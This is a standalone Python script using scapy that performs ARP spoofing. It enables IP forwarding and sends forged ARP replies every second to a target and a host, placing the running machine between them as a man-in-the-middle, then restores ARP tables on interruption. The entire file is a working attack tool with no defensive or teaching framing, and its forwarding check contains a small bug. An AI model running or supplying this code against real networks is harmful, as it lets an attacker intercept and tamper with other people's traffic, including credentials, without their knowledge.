import scapy.all as scapy
from scapy.all import send
import time

def enable_ip_forward():

    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read == 1:
            print("1")
            return
    with open(file_path, "w") as f:
        print(1, file=f)


def spoof(target, host):
    target_mac = scapy.getmacbyip(target)
    arp_response = scapy.ARP(pdst=target, hwdst=target_mac, psrc=host, op='is-at')

    send(arp_response, verbose=0)


def restore(target, host):
    target_mac = scapy.getmacbyip(target)
    host_mac = scapy.getmacbyip(host)
    arp_response = scapy.ARP(pdst=target, hwdst=target_mac, psrc=host, hwsrc=host_mac, op="is-at")
    send(arp_response, verbose=0, count=7)

def start_active_spoofing(host_ip, target_ip):
    enable_ip_forward()
    try:
        while True:
            spoof(target_ip, host_ip)
            spoof(host_ip, target_ip),
            time.sleep(1)

    except KeyboardInterrupt:
        print("[!] Keyboard Interuption CTRL+C ! restroring network...")

        restore(target_ip, host_ip)
        restore(host_ip, target_ip)
